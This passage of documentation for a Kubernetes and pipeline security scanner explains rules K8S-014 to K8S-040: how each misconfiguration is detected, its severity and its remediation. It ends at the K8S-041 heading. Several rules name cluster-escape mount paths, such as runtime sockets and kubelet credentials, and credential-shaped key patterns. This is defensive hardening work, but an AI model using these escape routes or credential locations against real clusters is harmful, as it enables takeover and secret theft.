**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Stricter than K8S-013: that rule flags any hostPath, this one upgrades to CRITICAL when the path is one of the well-known cluster-escape vectors.

**Recommendation.** Never mount the container runtime socket (``/var/run/docker.sock``, ``containerd.sock``, ``crio.sock``), kubelet credentials (``/var/lib/kubelet``), the cluster config (``/etc/kubernetes``), the host root (``/``), or ``/proc`` / ``/sys`` / ``/etc`` into a workload container. Each of these is a one-line cluster takeover. If a container genuinely needs node-level metrics, use an exporter DaemonSet with a narrowly-scoped read-only mount.

**Source:** [`K8S-014`](../providers/kubernetes.md#k8s-014) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-015`: Container missing resources.limits.memory <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-015 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Init containers and ephemeral containers are also checked: a leaking init container holds a slot on the node until it completes and can crowd out other pods just as readily as an application container.

**Recommendation.** Set ``resources.limits.memory`` on every container. Without a memory limit, a leaking or compromised container can consume the node's RAM until the kernel OOM-kills neighbouring pods, taking down workloads that share the node. Pair the limit with a ``requests.memory`` to inform the scheduler.

**Source:** [`K8S-015`](../providers/kubernetes.md#k8s-015) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-016`: Container missing resources.limits.cpu <span class="pg-sev pg-sev--low">LOW</span> { #detail-k8s-016 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Lower severity than K8S-015 because CPU throttling is self-healing (workloads slow down rather than die) and some controllers (e.g. SchedulerProfile, LimitRange) supply a cluster-default cpu limit transparently.

**Recommendation.** Set ``resources.limits.cpu`` on every container. CPU throttling is the kernel's defense against a neighbour consuming all node cycles, without a limit, a compromised container can stall everything else on the node, including the kubelet. Pair the limit with a ``requests.cpu`` for scheduling.

**Source:** [`K8S-016`](../providers/kubernetes.md#k8s-016) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-017`: Container env value carries a credential-shaped literal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-017 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS access keys outright, plus credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal. ``valueFrom`` entries are always safe (no inline value).

**Recommendation.** Replace literal ``env[].value`` entries that hold credentials with ``env[].valueFrom.secretKeyRef`` or ``envFrom.secretRef``. A literal env value lives in the manifest YAML. It gets committed to git, surfaced by ``kubectl get pod -o yaml``, and embedded in audit logs. Externalising into a Secret (and ideally a SealedSecret / ExternalSecret / SOPS-encrypted source) keeps the value out of the manifest.

**Source:** [`K8S-017`](../providers/kubernetes.md#k8s-017) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-018`: Secret stringData/data carries a credential-shaped literal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-018 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Walks both ``stringData`` (plain text) and ``data`` (base64). Base64-encoded values are decoded and checked for AKIA-shaped AWS keys. Credential-shaped key NAMES with any non-empty value are flagged regardless of encoding, even if the value is the literal placeholder ``REPLACE_ME``, having the name in the manifest is a maintenance footgun.

**Recommendation.** A ``Kind: Secret`` manifest committed to git defeats every secret-management story Kubernetes claims to provide, the base64 encoding in ``data`` is *not* encryption. Replace with SealedSecrets (Bitnami), ExternalSecrets / ESO, SOPS-encrypted manifests, or HashiCorp Vault Agent injection. If the manifest must remain in git, the only acceptable contents are placeholders that are filled in by an operator at apply time.

**Source:** [`K8S-018`](../providers/kubernetes.md#k8s-018) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-019`: Workload deployed in the 'default' namespace <span class="pg-sev pg-sev--low">LOW</span> { #detail-k8s-019 }

**Evidences:** [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** Severity is LOW because in a well-curated cluster the default namespace is empty by policy. If your cluster treats default as a sandbox you can suppress this rule via ``.pipelinecheckignore``.

**Recommendation.** Set ``metadata.namespace`` to a dedicated namespace per workload (or per environment). The ``default`` namespace tends to accumulate cluster-wide RoleBindings, NetworkPolicies, and operators that grant broader access than intended; placing application workloads there means every privilege grant in default applies to them. A purpose-built namespace also lets you enforce Pod Security Standards (``pod-security.kubernetes.io/enforce`` label) scoped to that workload.

**Source:** [`K8S-019`](../providers/kubernetes.md#k8s-019) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-020`: ClusterRoleBinding grants cluster-admin or system:masters <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-020 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** The rule fires on a ``ClusterRoleBinding`` whose ``roleRef.name`` is ``cluster-admin``, ``admin``, or ``system:masters``. Subject type does not matter, even binding cluster-admin to a Group is a cluster-takeover risk.

**Recommendation.** Replace cluster-admin / system:masters bindings with narrowly-scoped ClusterRoles or namespace-scoped Roles. Granting cluster-admin to a service account is equivalent to giving every pod that uses it root on every node, credential theft from any such pod becomes immediate cluster takeover. Audit-log every existing cluster-admin binding and replace each with the minimum verbs/resources the consumer actually needs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [Tesla Kubernetes dashboard compromise](https://redlock.io/cloud-security-trends-october-2018) (RedLock, 2018): an unauthenticated Kubernetes dashboard exposed to the internet held tokens for service accounts bound to cluster-admin. Attackers used the dashboard credentials to deploy crypto-mining workloads with full cluster access. Least-privilege RBAC would have capped the blast radius even after dashboard exposure.
- Argo CD [CVE-2022-24348](https://www.cve.org/CVERecord?id=CVE-2022-24348) (2022): a Helm path-traversal bug let a project member read other applications' YAML, exposing credentials. Combined with the default cluster-admin RBAC install, the recovered tokens were a direct cluster takeover. Argo's recommendation post-fix was to scope the controller's RBAC away from cluster-admin so a similar future bug couldn't escalate the same way.

**Source:** [`K8S-020`](../providers/kubernetes.md#k8s-020) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-021`: Role or ClusterRole grants wildcard verbs+resources <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-021 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Fires on any rule entry where BOTH ``verbs`` and ``resources`` contain a literal ``"*"``. A wildcard in only one of the two is still risky but is often a legitimate read-everything pattern (e.g. monitoring); this rule targets the strict superset 'do anything to everything'.

**Recommendation.** Replace ``verbs: ["*"]`` and ``resources: ["*"]`` with explicit lists. Wildcards bypass the principle of least privilege: today they grant `read pods` and tomorrow they grant `delete crds` because a new resource was registered in that apiGroup. Explicit verbs (``get``, ``list``, ``watch``) and explicit resources (``configmaps``, ``services``) keep grants stable across cluster upgrades.

**Source:** [`K8S-021`](../providers/kubernetes.md#k8s-021) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-022`: Service exposes SSH (port 22) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-022 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Mirrors DF-013 (``EXPOSE 22`` in a Dockerfile) at the Service level. The check fires on Service ports whose ``port`` or ``targetPort`` is 22, regardless of Service type, a NodePort/LoadBalancer 22 is dramatically worse but a ClusterIP 22 still indicates an sshd container somewhere.

**Recommendation.** Containers should not run sshd. If you need an interactive shell into a running pod, use ``kubectl exec`` (subject to RBAC) or ``kubectl debug``. Removing the port-22 Service removes a pre-auth network surface that's a frequent lateral-movement target after initial cluster compromise.

**Source:** [`K8S-022`](../providers/kubernetes.md#k8s-022) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-023`: Namespace missing Pod Security Admission enforcement label <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-023 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Pod Security Admission (PSA) replaced the deprecated PodSecurityPolicy in 1.25. The three levels are ``privileged``, ``baseline``, and ``restricted``; ``baseline`` is a sensible production default and ``restricted`` matches the spirit of K8S-005..010. ``kube-system`` is exempt by convention since control-plane pods may legitimately need elevated permissions.

**Recommendation.** Set ``metadata.labels.pod-security.kubernetes.io/enforce`` to ``baseline`` or ``restricted`` on every Namespace. Without an enforce label the namespace runs the cluster's default policy, which on most installations is ``privileged`` and silently admits pods that violate every K8S-002..010 rule.

**Known false positives.**

- Single-tenant clusters running only operator-managed workloads may apply PSA via an admission webhook instead. The label-based check can't see that.

**Source:** [`K8S-023`](../providers/kubernetes.md#k8s-023) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-024`: Container missing both livenessProbe and readinessProbe <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-024 }

**Evidences:** [`ESF-C-DEPLOY-MON`](#ctrl-esf-c-deploy-mon) Monitor deployments with alarms / health checks.

**How this is detected.** Init containers and ephemeral debug containers are exempt, neither makes sense to probe. Jobs and CronJobs are also exempt because Kubernetes treats them as one-shot work; completion is the lifecycle signal, not health.

**Recommendation.** Define at least one of ``livenessProbe`` or ``readinessProbe`` on every long-running container. Without probes, a wedged pod stays listed as ``Running`` and keeps receiving traffic, which masks incidents and amplifies the blast radius of a single faulty replica.

**Source:** [`K8S-024`](../providers/kubernetes.md#k8s-024) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-025`: System priority class used outside kube-system <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-025 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** The kubelet reserves the two ``system-*`` priority classes for its own pods (kube-proxy, CNI agents). Granting them to a user workload also grants the right to preempt and evict anything below 2000000000, which is every non-system pod on the cluster. Outside kube-system this is almost always a misconfiguration copy-pasted from a control-plane manifest.

**Recommendation.** Reserve ``system-cluster-critical`` and ``system-node-critical`` priority classes for control-plane workloads in ``kube-system``. Application pods that adopt them gain the right to evict normal workloads under resource pressure, which is a quiet path to a cluster-wide outage if the application has a bug or the attacker has any control over its spec.

**Source:** [`K8S-025`](../providers/kubernetes.md#k8s-025) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-026`: LoadBalancer Service has no loadBalancerSourceRanges <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-026 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Internal-only services should use ``type: ClusterIP`` (and an Ingress for HTTP) or set the cloud-provider-specific internal-LB annotation. ``loadBalancerSourceRanges`` is the Kubernetes-native, cloud-portable way to scope an external LB; cloud-specific firewalls (AWS security groups, GCP firewall rules) are equivalent at the L4 level but invisible to a manifest scanner.

**Recommendation.** Restrict every ``Service`` of ``type: LoadBalancer`` with ``spec.loadBalancerSourceRanges``. The default behavior is to provision an internet-facing load balancer that accepts traffic from 0.0.0.0/0, which exposes whatever the Service fronts to the entire internet. A short list of CIDRs scoped to known clients (office IPs, a NAT gateway, peered VPCs) removes the pre-auth attack surface entirely.

**Source:** [`K8S-026`](../providers/kubernetes.md#k8s-026) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-027`: Ingress has no TLS configuration <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-027 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** An Ingress with no ``spec.tls`` (or an empty list) terminates HTTP at the load balancer and proxies plaintext upstream. Ingress controllers will respect ``ssl-redirect`` annotations, but those are advisory until ``tls:`` is populated. If the Ingress is intentionally HTTP-only (e.g. an ACME challenge endpoint or an internal-only path served behind a network policy), suppress via ``.pipelinecheckignore`` with a short rationale rather than leaving it open.

**Recommendation.** Add a ``spec.tls`` block to every Ingress that fronts an HTTP backend. Each entry pairs one or more hostnames with a Secret holding the certificate / key, the canonical pattern is to provision the Secret via cert-manager and a ClusterIssuer pointing at Let's Encrypt or an internal CA. Plaintext-only Ingress lets a network attacker downgrade the connection and read or rewrite request bodies, which matters for any path carrying credentials, session cookies, or PII.

**Source:** [`K8S-027`](../providers/kubernetes.md#k8s-027) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-028`: Container declares hostPort <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-028 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** ``hostPort`` was the pre-Service way to publish a pod's port and survives in legacy manifests. Modern clusters use Services, which integrate with the kube-proxy, ingress controllers, and NetworkPolicies. ``hostPort`` is invisible to all of those, a port-scan from any other pod that knows the node IP reaches the workload directly. If a DaemonSet legitimately needs it (host-agent shape), suppress this rule with a brief ``.pipelinecheckignore`` rationale rather than leaving it open across the catalog.

**Recommendation.** Drop ``hostPort`` from container ports and use a Service (ClusterIP / NodePort / LoadBalancer) to publish the workload. ``hostPort`` binds directly to the node IP, bypasses the cluster's network model, and creates a node-level scheduling constraint that fails replicas with the same port. Workloads that genuinely need node-port binding (some CNI/storage agents) should declare it on a DaemonSet with ``hostNetwork: true`` already approved by review.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-028`](../providers/kubernetes.md#k8s-028) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-029`: RoleBinding grants permissions to the default ServiceAccount <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-029 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Fires when a ``RoleBinding`` or ``ClusterRoleBinding`` lists ``kind: ServiceAccount, name: default`` among its subjects. ``kube-system``, ``kube-public``, and ``kube-node-lease`` are exempt because control-plane bootstrap manifests legitimately grant the default SA there.

**Recommendation.** Bind permissions to a dedicated ServiceAccount, not to ``default``. Every pod that omits ``serviceAccountName`` runs as the namespace's ``default`` SA, so a binding to it grants the same verbs to every untargeted pod in that namespace, including future workloads. Create a purpose-built SA, set ``automountServiceAccountToken: false`` on the default, and bind to the new SA explicitly.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Charts that intentionally re-use the default SA in single-tenant namespaces. Consider creating a named SA anyway. It keeps the audit log unambiguous about which workload made an API call.

**Source:** [`K8S-029`](../providers/kubernetes.md#k8s-029) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-030`: Workload schedules onto a control-plane node <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-030 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Fires on a non-system workload whose ``spec.nodeSelector`` contains a control-plane role label, OR whose ``spec.tolerations`` carries an entry with a control-plane taint key. Either condition is sufficient to land the pod on the control plane (the toleration is what survives the node taint; the nodeSelector picks the node).

**Recommendation.** Drop the ``nodeSelector`` and ``tolerations`` entries that target ``node-role.kubernetes.io/control-plane`` (or the legacy ``master`` spelling) from non-system workloads. A pod scheduled on a control-plane node shares the kernel with the API server, etcd, and kubelet credentials, credential theft from any such pod yields cluster-wide takeover. Application workloads belong on dedicated worker nodes; system add-ons that legitimately need control-plane scheduling should run as a DaemonSet in ``kube-system``.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Audit/log shippers and CNI agents in kube-system are exempt by namespace. A workload that legitimately needs to run on the control plane outside kube-system is rare enough to warrant an explicit ``.pipelinecheckignore`` rationale.

**Source:** [`K8S-030`](../providers/kubernetes.md#k8s-030) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-031`: Namespace missing PSA warn label <span class="pg-sev pg-sev--low">LOW</span> { #detail-k8s-031 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Pod Security Admission supports three modes: ``enforce`` (reject), ``audit`` (log to API audit), and ``warn`` (return a kubectl warning). K8S-023 covers ``enforce``; this rule covers ``warn``. The convention from upstream PSA docs is to set ``warn`` to the next-strictest tier above your current ``enforce`` so an upgrade from baseline to restricted is a predictable rollout, not a surprise.

**Recommendation.** Set ``metadata.labels.pod-security.kubernetes.io/warn`` on every Namespace, ideally one tier ahead of the enforce label (e.g. ``enforce: baseline`` + ``warn: restricted``). The warn level surfaces violations as ``kubectl apply`` warnings without rejecting the resource, developers see what would break before an enforcement upgrade lands.

**Known false positives.**

- Single-tenant clusters may set ``warn`` and ``audit`` globally via the AdmissionConfiguration ``defaults:`` block instead of per-namespace labels. The label-based check can't see that.

**Source:** [`K8S-031`](../providers/kubernetes.md#k8s-031) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-032`: Namespace lacks default-deny NetworkPolicy <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-032 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Kubernetes' default network model is allow-everything: without any NetworkPolicy targeting a namespace, every pod can talk to every other pod across every namespace, and every pod can reach the internet. A default-deny policy flips the default to deny, so the only flows that work are those an explicit allow policy permits. The check fires on namespaces declared in the manifest set that have at least one workload but no default-deny NetworkPolicy covering them. Cross-doc correlation: it walks the full manifest stream to match Namespace/workload/NetworkPolicy across files.

**Recommendation.** Apply a default-deny NetworkPolicy in every namespace that carries workloads. The canonical shape is ``podSelector: {}`` (matches every pod) plus ``policyTypes: [Ingress, Egress]`` with no ``ingress:`` / ``egress:`` rules, every flow is denied unless a more permissive NetworkPolicy in the same namespace explicitly allows it. Pair with per-workload allow-list policies for the flows the application actually needs.

**Known false positives.**

- Mesh-managed clusters (Istio, Linkerd, Cilium ClusterMesh) often delegate L4 default-deny to the mesh's authorization policy. The check only looks at native NetworkPolicy and won't see that.
- kube-system / kube-public / kube-node-lease are exempt, control-plane components frequently need open networking and have their own admission-time guards.

**Source:** [`K8S-032`](../providers/kubernetes.md#k8s-032) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-033`: Namespace lacks ResourceQuota or LimitRange <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-033 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Without a ResourceQuota, a single namespace can consume the cluster's entire scheduling capacity, a fork bomb in a CronJob, a memory leak in a Deployment, or a cryptominer that landed via a fork-PR build can starve every other tenant. Without a LimitRange, individual pods without explicit ``resources:`` requests get a default of zero, the scheduler treats them as best-effort and packs them on any node, including ones already at memory pressure. The two work together: quota caps the aggregate, range caps the per-workload baseline. Cross-doc correlation: walks the manifest stream to match Namespace / workload / ResourceQuota / LimitRange across files.

**Recommendation.** Apply a ``ResourceQuota`` *and* a ``LimitRange`` to every namespace that hosts application workloads. ResourceQuota caps the namespace's total CPU / memory / pod / object consumption; LimitRange enforces per-pod request / limit defaults so a workload that forgets to declare its own doesn't get unbounded scheduling. Together they bound the blast radius of a runaway, leaky, or attacker-driven pod explosion to a single namespace.

**Source:** [`K8S-033`](../providers/kubernetes.md#k8s-033) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-034`: ServiceAccount automountServiceAccountToken not explicitly false <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-034 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** K8S-012 covers the pod-level ``automountServiceAccountToken`` setting; this rule covers the same control at the ServiceAccount level. The two are complementary: the SA-level default flips the cluster-wide baseline (``true`` -> ``false``), the pod-level override re-enables only where needed. Without the SA-level disable, every pod that doesn't set its own override mounts a token that can call the K8s API as that SA, a useful credential for an attacker who lands code in any pod, regardless of the workload's own intent.

**Recommendation.** Set ``automountServiceAccountToken: false`` at the ServiceAccount level for every SA that doesn't actively need to call the Kubernetes API. The pods that legitimately do (operators, sidecars that read namespaces, controllers) can opt back in per-pod via ``spec.automountServiceAccountToken: true``. The default is mount-everywhere, which is the wrong direction for least privilege.

**Known false positives.**

- Operator / controller workloads (cert-manager, metrics-server, ingress controllers) legitimately need API access from every pod. Their dedicated SAs should keep automount enabled, leave them out of the cluster-wide disable. ``default`` SA in every namespace is the high-fire case worth disabling.

**Source:** [`K8S-034`](../providers/kubernetes.md#k8s-034) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-035`: Container securityContext.runAsUser is 0 <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-035 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** K8S-007 covers ``runAsNonRoot: false`` (the boolean form). This rule covers the explicit numeric form: a container that sets ``runAsUser: 0`` runs as root regardless of ``runAsNonRoot`` being declared elsewhere. Kubernetes won't reject the spec, it just runs the container as root. The two rules are paired so neither shape slips through alone. The pod-level ``securityContext.runAsUser`` inherits to every container that doesn't override it; this rule fires on the *effective* UID, walking pod-level first then per-container override.

**Recommendation.** Set ``securityContext.runAsUser`` to a non-zero UID (e.g. 1000 or any application-specific value) on every workload container. The corresponding ``runAsGroup`` and ``fsGroup`` should also be non-zero. Root inside a container is not isolation, a kernel CVE, a misconfigured mount, or a mis-applied capability collapses straight into the host.

**Source:** [`K8S-035`](../providers/kubernetes.md#k8s-035) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-036`: ServiceAccount imagePullSecrets references missing Secret <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-036 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Cross-doc correlation: walks every ServiceAccount's ``imagePullSecrets`` and confirms the named Secret exists in the same namespace within the manifest set. Misses two cases: secrets created out-of-band (Sealed Secrets, External Secrets, or operator-applied ones) and SAs whose namespace is implicit / not declared in the manifest set. For those, the rule passes, false-negative-friendly.

**Recommendation.** Create the missing ``Kind: Secret`` of ``type: kubernetes.io/dockerconfigjson`` (or ``dockercfg``) in the same namespace before applying the ServiceAccount, or fix the ``imagePullSecrets`` reference name. A dangling reference doesn't fail apply, kubelet silently falls back to anonymous registry pulls on every image fetch. Workloads either pull a different image than the operator intended or fail at runtime with ``ImagePullBackOff`` after the registry rate-limits the unauthenticated client.

**Known false positives.**

- Manifests rendered for partial deployment where the secret lives in a parallel manifest set the scanner doesn't see (separate ArgoCD application, Vault-injected, ESO-synced). Add ``# pipeline-check: ignore K8S-036`` or ignore the specific SA name to silence.

**Source:** [`K8S-036`](../providers/kubernetes.md#k8s-036) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-037`: ConfigMap data carries a credential-shaped literal <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-037 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Companion to K8S-018 (which scans Kind: Secret). Walks ConfigMap ``data`` and ``binaryData`` for AKIA-shaped AWS keys and credential-shaped key NAMES. Even when the value is a placeholder, having ``api_key: REPLACE_ME`` in a ConfigMap is a maintenance footgun, someone will fill it in and commit. RBAC scoping for ``configmaps`` is typically much broader than ``secrets``, so any credential leak via this path reaches a wider audience.

**Recommendation.** Move the value out of the ConfigMap. Secrets belong in ``Kind: Secret`` (better: SealedSecrets, ExternalSecrets / ESO, SOPS-encrypted manifests, or HashiCorp Vault Agent injection). ConfigMaps are intended for non-sensitive config and are mounted into pods without the access controls Secrets carry, the ``RoleBinding`` for ``configmaps:get`` is typically far broader than the one for ``secrets:get``. A credential in a ConfigMap is effectively unprotected once any pod can read the namespace's config.

**Known false positives.**

- ConfigMaps that legitimately carry placeholder names (``DEBUG_TOKEN_FORMAT``, ``LICENSE_KEY_HEADER``) where the VALUE is a format hint rather than a credential. Rename the key to avoid the credential-shaped name.

**Source:** [`K8S-037`](../providers/kubernetes.md#k8s-037) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-038`: NetworkPolicy ingress / egress allows all sources or destinations <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-038 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** K8S-032 covers the absence of a default-deny NetworkPolicy. This rule covers the inverse: a NetworkPolicy that exists but contains an ``ingress:`` rule with no ``from:`` (allow from all) or no ``ports:`` filter, or an ``egress:`` rule with no ``to:`` filter. The ``from: []`` / ``to: []`` shorthand is the canonical mistake. A rule that lists specific peers via ``podSelector`` / ``namespaceSelector`` / ``ipBlock`` passes.

**Recommendation.** Replace the empty ``from: []`` / ``to: []`` rule with an explicit ``from: [{podSelector: {matchLabels: {…}}}]`` or ``from: [{namespaceSelector: {matchLabels: {…}}}]`` that names the legitimate peer. An empty ``from`` / ``to`` peers list means *every* source / destination, every pod in every namespace, plus every external IP. This is indistinguishable from having no NetworkPolicy at all for the targeted pod, but visually appears to enforce a policy (the false-sense-of-security failure mode is worse than no policy).

**Known false positives.**

- Policies intentionally allowing world traffic to a public ingress controller pod ({app: nginx-ingress, public: true}). Add ``# pipeline-check: ignore K8S-038`` on the specific NetworkPolicy if the wide-open shape is deliberate.

**Source:** [`K8S-038`](../providers/kubernetes.md#k8s-038) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-039`: Pod uses shareProcessNamespace: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-039 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** ``shareProcessNamespace: true`` makes every container in the pod share a single PID namespace. Any container can then enumerate every other container's processes (``ps``), read their environment variables and CLI args from ``/proc/<pid>/``, send them signals, and (with the right capabilities) ``ptrace`` them. A compromised sidecar, debug shell, logging agent, observability exporter, gets a free pivot into every primary container's secrets. The default is ``false``; setting it explicitly to ``true`` is the failing shape.

**Recommendation.** Drop ``spec.shareProcessNamespace: true`` from the pod spec. Containers in the pod will go back to having isolated PID namespaces, each sees only its own processes, can't ``ptrace`` neighbors, and can't read their ``/proc/<pid>/environ`` for env-var-leaked secrets. If the requirement is sidecar-style log collection or process-level cooperation, prefer a sidecar pattern that exchanges data through a shared volume rather than collapsing the namespace.

**Known false positives.**

- Debug pods that explicitly need ``ps`` / ``strace`` across container boundaries, but those are typically ephemeralContainers attached to a running pod, not long-lived pod specs in a manifest. If a permanent workload genuinely requires it, ignore the rule with a documented justification.

**Source:** [`K8S-039`](../providers/kubernetes.md#k8s-039) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-040`: Container securityContext.procMount: Unmasked <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-040 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** ``procMount: Unmasked`` is rarely needed in practice. It exists for nested-container / KubeVirt scenarios where the container itself runs an inner container runtime that needs to set up its own ``/proc`` masking. For an ordinary application container, ``Unmasked`` is a runtime-isolation regression that exposes kernel-information paths and writable ``/proc/sys`` entries to the workload. Pod Security Standards classify ``Unmasked`` as 'restricted'-violating; the rule fires when any container (``containers``, ``initContainers``, ``ephemeralContainers``) explicitly sets ``procMount: Unmasked``.

**Recommendation.** Remove ``securityContext.procMount: Unmasked`` (or set it explicitly to ``Default``). The default ``Default`` procMount type masks several kernel- and node-information paths under ``/proc`` (``/proc/asound``, ``/proc/acpi``, ``/proc/kcore``, ``/proc/keys``, ``/proc/latency_stats``, ``/proc/timer_list``, ``/proc/timer_stats``, ``/proc/sched_debug``, ``/proc/scsi``) and remounts ``/proc/sys`` as read-only. These maskings are what stop a container from reading the host's kernel structures or writing to ``/proc/sys`` and breaking the kernel out of namespace isolation. ``Unmasked`` undoes all of that.

**Source:** [`K8S-040`](../providers/kubernetes.md#k8s-040) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-041`: Service.externalIPs allows traffic interception (CVE-2020-8554) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-041 }

